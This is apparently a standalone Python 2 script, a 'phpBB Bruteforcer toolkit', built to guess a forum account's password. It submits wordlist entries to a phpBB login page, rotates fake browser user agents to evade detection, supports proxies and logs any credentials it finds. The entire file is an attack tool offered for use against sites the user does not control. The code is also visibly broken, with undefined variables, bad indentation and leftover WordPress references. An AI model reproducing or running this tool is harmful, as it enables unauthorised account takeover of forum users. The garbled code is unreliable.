#!/usr/bin/python

# This is PHPbb Bruteforcer toolkit
# Author will not be responsible for any damage !!
# Toolname : phpbb-bruteforcer.py
# Programmer : nitro_hitman| @gmail.com | Skype=nitrohitmanhacker >
# Version : 0.2.1
# Date : 2 november 2012

import re
import os
import sys
import getopt
import random
import warnings
import time
try:
    import mechanize
except ImportError:
    print "[*] Please install mechanize python module first"
    sys.exit(1)
except KeyboardInterrupt:
    print "\n[*] Exiting program...\n"
    sys.exit(1)
try:
    import cookielib
except ImportError:
    print "[*] Please install cookielib python module first"
    sys.exit(1)
except KeyboardInterrupt:
    print "\n[*] Exiting program...\n"
    sys.exit(1)
    
warnings.filterwarnings(action="ignore", message=".*gzip transfer encoding is experimental!", category=UserWarning)

# define variable
__programmer1__ = " | nitro_hitman| @gmail.com |Skype=nitrohitmanhacker >
__version__        = "0.2.1"
verbose     = False
useproxy    = False
usepassproxy    = False
log        = 'wpbruteforcer.log'
file        = open(log, "a")
#success        = target + '/forum'

# some cheating ..
ouruseragent     = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
        'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
        'Microsoft Internet Explorer/4.0b1 (Windows 95)',
        'Opera/8.00 (Windows NT 5.1; U; en)',
        'amaya/9.51 libwww/5.4.0',
        'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
        'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
        'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
        'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
        ]
phpbb     = '''
_______ ___    __   _______
|    __ \   \   \ \ |    __ \
|   |__\ \  |Ked| | |   |__\ \
|   _____/  |___| | |  ______/
|  |Bb | vr |___| | |  |bB
|  |bB |0.1 |Ans| | |  |Bb
|__|Bb |____|-Dz|_| |__|bB
            ..............> PHPbb Free Forums
    ...........> Bruteforcer Toolkit v0.2.1
                    
Programmer : %s
             %s
Version       : %s''' % (__programmer1__,__programmer2__, __version__)
option               = '''
Usage  : %s [options]
Option : -t, --target   <hostname>    |   Site for bruteforce wp-admin
         -u, --username <username>  |   User for bruteforcing
         -w, --wordlist <filename>  |   Wordlist used for bruteforcing
         -v, --verbose                |   Set %s will be verbose (more talkactiveable)
         -p, --proxy    <host:port>    |   Set http proxy will be use
         -k, --usernameproxy    <username>    |   Set username at proxy will be use
         -i, --passproxy    <password>    |   Set password at proxy will be use
         -l, --log         <filename>    |   Specify output filename (default : fbbruteforcer.log)
         -h, --help     <help>      |   Print this help
                                                            
Example : %s -t target.com -u admin -w wordlist.txt"
      
P.S : add "&" to run in the background  
''' % (sys.argv[0], sys.argv[0], sys.argv[0])
hme         = '''
Usage : %s [option]
    -h or --help for get help
    ''' % sys.argv[0]


def helpme():
    print phpbb
    print option
    file.write(phpbb)
    file.write(option)
    sys.exit(1)
    
def helpmee():
    print phpbb
    print hme
    file.write(phpbb)
    file.write(hme)
    sys.exit(1)
try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:u:w:l:p:k:i:v:", ["help","target=","user=","wordlist=","log=","proxy=","userproxy=","passproxy=","verbose="])
except getopt.GetoptError as err:
   print(err)
   helpme()
   sys.exit(2)
for o, a in opts:
    try:
            if o in ("-u", "--user"):
            username = a
        elif o in ("-t", "--target"):
            target = a
           #if "http://" in target:
             #target = target.replace("http://","")
           #if "www." in target:
             #target = target.replace("www.","")
            targetsite = "http://www."+target+"/ucp.php?mode=login"
        elif o in ("-w", "--wordlist"):
                wordlist = a
        elif o in ("-l", "--log"):
                log = a
        elif o in ("-p", "--proxy"):
                useproxy = True
                proxy = a
        elif o in ("-k", "--userproxy"):
                usepassproxy = True
                usw = a
        elif o in ("-i", "--passproxy"):
                usepassproxy = True
                usp = a
        elif o in ("-v", "--verbose"):
                verbose = True
        elif o in ("-h", "--help"):
                helpme()
        elif len(sys.argv) <= 1:
        helpmee()
    except IOError:
        helpme()
    except NameError:
        helpme()
    except IndexError:
        helpme()
                    
def bruteforce(word):
    try:
        sys.stdout.write("\r[*] Trying %s...                   \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t " % word)
        file.write("[*] Trying %s\n" % word)
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(ouruseragent))]
        opensite = br.open(targetsite)
        br.select_form(nr=0)
        br.form['username'] = username
        br.form['password'] = word
        br.submit()
        response = br.response().read()
        if verbose:
            print response
        if success in response:
            print "\n\n[*] Logging in success..."
            print "[*] Username : %s" % (username)
            print "[*] Password : %s\n" % (word)
            file.write("\n[*] Logging in success...")
            file.write("\n[*] Username : %s" % (username))
            file.write("\n[*] Password : %s\n\n" % (word))
            sys.exit(1)    
    except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        sys.exit(1)
    except mechanize._mechanize.FormNotFoundError:
        print "\n[*] Can't launch attack sorry, form is different\n"
        file.write("\n[*] Can't launch attack sorry, form is different\n")
        sys.exit(1)
    except mechanize._form.ControlNotFoundError:
        print "\n[*] Can't launch attack sorry, form is different\n"
        file.write("\n[*] Can't launch attack sorry, form is different\n")
        sys.exit(1)
        
def releaser():
    global word        
    for word in words:
        bruteforce(word.replace("\n",""))
        
def main():
    global br
    global words
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_debug_http(False)
        br.set_debug_redirects(False)
        br.set_debug_redirects(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        if useproxy:
            br.set_proxies({"http": proxy})
        if usepassproxy:
            br.add_proxy_password(usw, usp)
        if verbose:
            br.set_debug_http(True)
            br.set_debug_redirects(True)
            br.set_debug_redirects(True)
    except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        file.write("\n[*] Exiting program...\n")
        sys.exit(1)
    try:
        preventstrokes = open(wordlist, "r")
        words            = preventstrokes.readlines()
        count          = 0
        while count < len(words):
            words[count] = words[count].strip()
            count += 1
    except IOError:
          print "\n[*] Error: Check your wordlist path\n"
        file.write("\n[*] Error: Check your wordlist path\n")
          sys.exit(1)
    except NameError:
        helpme()
    except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        file.write("\n[*] Exiting program...\n")
        sys.exit(1)
    try:
        print phpbb
        print "\n[*] Starting attack at %s" % time.strftime("%X")
        print "[*] Target site : %s" % (targetsite)
        print "[*] Account for bruteforcing \"%s\"" % (username)
        print "[*] Loaded :",len(words),"words"
        print "[*] Bruteforcing phpBB login, please wait..."
        file.write(phpbb)
        file.write("\n[*] Starting attack at %s" % time.strftime("%X"))
        file.write("\n[*] Target site : %s" % (targetsite))
        file.write("\n[*] Account for bruteforcing \"%s\"" % (username))
        file.write("\n[*] Loaded : %d words" % int(len(words)))
        file.write("\n[*] Bruteforcing phpBB login, please wait...\n")
    except KeyboardInterrupt:
        print "\n[*] Exiting program...\n"
        sys.exit(1)
    try:
        releaser()
        bruteforce(word)
    except NameError:
        helpme()

if __name__ == '__main__':
    main()